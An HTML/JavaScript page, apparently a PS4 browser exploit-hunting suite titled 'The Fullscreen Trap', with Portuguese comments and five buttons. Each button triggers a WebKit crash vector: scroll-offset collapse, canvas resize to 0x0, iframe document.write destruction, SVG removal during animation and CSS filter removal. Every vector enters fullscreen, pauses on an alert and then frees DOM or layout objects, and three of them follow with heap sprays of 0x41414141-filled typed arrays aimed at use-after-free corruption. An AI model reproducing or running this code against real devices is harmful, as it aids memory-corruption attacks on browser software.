<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v550000: The Fullscreen Trap</title>
<style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0f0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #002; color: #fff; font-weight: bold;
    }
    .inst { font-size: 0.9em; color: #aaa; margin-bottom: 15px; }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #020; color: #fff; border: 2px solid #0f0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    
    #stage { background: #111; height: 100px; border: 1px solid #555; margin-top: 20px; overflow: auto; }
</style>
</head>
<body>

<h1>v550000: THE FULLSCREEN TRAP</h1>

<div class="status" id="msg">
    PADRÃO: FULLSCREEN -> INJEÇÃO -> ALERTA -> CRASH<br>
    CLIQUE E SIGA AS INSTRUÇÕES DO ALERTA
</div>

<button onclick="trap(t01)">01. Scroll Offset Attack (Layout Crash)</button>

<button onclick="trap(t02)">02. Canvas 0x0 Resize Race</button>

<button onclick="trap(t03)">03. Iframe Write Destruction</button>

<button onclick="trap(t04)">04. SVG Animation Detach</button>

<button onclick="trap(t05)">05. CSS Filter GPU Overload</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // Spray Global (AAAA...)
    let spray_memory = [];
    const payload = new Uint32Array(1024).fill(0x41414141);

    function trap(vectorFunc) {
        Stage.innerHTML = "";
        spray_memory = [];
        
        // 1. Configura o cenário
        const element = vectorFunc(Stage);
        
        // 2. Fullscreen IMEDIATO (Precisa ser no evento de clique)
        if (document.body.webkitRequestFullscreen) document.body.webkitRequestFullscreen();
        else if (document.body.requestFullscreen) document.body.requestFullscreen();

        // 3. Agenda a Injeção e o Alerta para logo após o Fullscreen engajar
        setTimeout(() => {
            if(element._inject_and_alert) element._inject_and_alert();
        }, 800); // 800ms é o tempo médio da animação de fullscreen do PS4
    }

    // =================================================================
    // 01. Scroll Offset Attack (Layout Crash)
    // Cria uma página muito longa, rola até o final, pausa com alerta,
    // e destrói o conteúdo ao retomar. O navegador tenta manter o scroll num abismo.
    // =================================================================
    function t01(stage) {
        const d = document.createElement('div');
        d.style.height = "10000px"; // Muito alto
        d.style.background = "linear-gradient(red, blue)";
        d.innerText = "SCROLL DOWN...";
        stage.appendChild(d);

        d._inject_and_alert = () => {
            // Rola para o fundo
            stage.scrollTop = 9000;
            
            // O ALERTA (PAUSA)
            window.alert("⚠️ SCROLL TRAP ⚠️\nO navegador está segurando a posição de rolagem.\nAo clicar OK, vamos puxar o tapete.");
            
            // O CRASH (PÓS-OK)
            d.remove(); // Remove o conteúdo
            stage.style.height = "0px"; // Colapsa o container
            
            // Tenta ler a posição de scroll do elemento morto
            const x = stage.scrollTop; 
            
            // Spray para ocupar a memória do layout antigo
            for(let i=0; i<2000; i++) spray_memory.push(new Uint32Array(payload));
        };
        return d;
    }

    // =================================================================
    // 02. Canvas Resize Bomb
    // Cria um Canvas gigante, pausa, e redimensiona para 0x0.
    // Isso força a GPU a descartar texturas violentamente.
    // =================================================================
    function t02(stage) {
        const cvs = document.createElement('canvas');
        cvs.width = 1920; cvs.height = 1080; // Full HD Texture
        const ctx = cvs.getContext('2d');
        ctx.fillStyle = 'red';
        ctx.fillRect(0,0,1920,1080);
        stage.appendChild(cvs);

        cvs._inject_and_alert = () => {
            // O ALERTA (PAUSA)
            window.alert("⚠️ GPU MEMORY LOCK ⚠️\nTemos uma textura 1080p na memória.\nAo clicar OK, vamos zerar o tamanho.");
            
            // O CRASH (PÓS-OK)
            cvs.width = 0;
            cvs.height = 0;
            
            // Tenta desenhar no canvas "morto" imediatamente
            try {
                ctx.fillRect(0,0,100,100);
            } catch(e) {}
            
            // Spray massivo
            for(let i=0; i<1000; i++) spray_memory.push(new Float64Array(1000).fill(1.1));
        };
        return cvs;
    }

    // =================================================================
    // 03. Iframe Write Destruction
    // O mais perigoso para WebKit.
    // Usa document.write() para limpar um iframe ativo.
    // =================================================================
    function t03(stage) {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);
        
        ifr.onload = () => {
            const doc = ifr.contentDocument;
            doc.body.innerHTML = "<h1>ALVO</h1>".repeat(100);
        };

        ifr._inject_and_alert = () => {
            // O ALERTA
            window.alert("⚠️ IFRAME NUKE ⚠️\nAo clicar OK, vamos sobrescrever o documento ativo.");
            
            // O CRASH
            const doc = ifr.contentDocument;
            doc.open();
            doc.write("<h1>DEAD</h1>"); // Isso destrói todo o DOM anterior
            doc.close();
            
            // Tenta acessar elementos do DOM antigo (que deveriam estar mortos)
            // Criando confusão de referências
            history.pushState(null, null, "#leak");
        };
        return ifr;
    }

    // =================================================================
    // 04. SVG Animation Detach
    // SVG usa muitos objetos complexos na memória.
    // Animamos um SVG e removemos ele durante a pausa.
    // =================================================================
    function t04(stage) {
        // SVG com animação
        stage.innerHTML = `
            <svg width="500" height="500">
                <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow">
                    <animate attributeName="cx" from="50" to="450" dur="1s" repeatCount="indefinite" />
                </circle>
            </svg>
        `;

        return {
            _inject_and_alert: () => {
                window.alert("⚠️ SVG ANIMATION ⚠️\nO círculo está se movendo.\nAo clicar OK, deletamos o universo.");
                
                // O CRASH
                stage.innerHTML = ""; // Remove o SVG enquanto ele anima
                
                // Força recálculo de estilo
                const force = document.body.offsetWidth;
                
                // Heap Spray
                for(let i=0; i<500; i++) spray_memory.push(new Uint32Array(payload));
            }
        };
    }

    // =================================================================
    // 05. CSS Filter GPU Overload
    // Aplica um filtro de desfoque (Blur) pesadíssimo.
    // O PS4 odeia CSS Filters. Pausar e remover o filtro pode crashar o driver de vídeo.
    // =================================================================
    function t05(stage) {
        const d = document.createElement('div');
        d.style.width = "100%"; d.style.height = "100%";
        d.style.background = "url('https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png')"; // Imagem qualquer ou cor
        d.style.backgroundSize = "cover";
        d.innerText = "GPU STRESS";
        d.style.fontSize = "50px";
        d.style.color = "white";
        
        // Aplica filtro pesado
        d.style.filter = "blur(20px) contrast(200%)";
        d.style.transition = "filter 2s";
        
        stage.appendChild(d);

        d._inject_and_alert = () => {
            // Muda o filtro para iniciar transição na GPU
            d.style.filter = "blur(0px)";
            
            window.alert("⚠️ GPU FILTER TRAP ⚠️\nO driver de vídeo está processando o Blur.\nClique OK para abortar.");
            
            // O CRASH: Remove o elemento da árvore de renderização
            d.style.display = "none";
            
            // Tenta acessar estilo computado (força a GPU a responder sobre o objeto oculto)
            const style = window.getComputedStyle(d);
            const val = style.filter;
        };
        return d;
    }

</script>
</body>
</html>
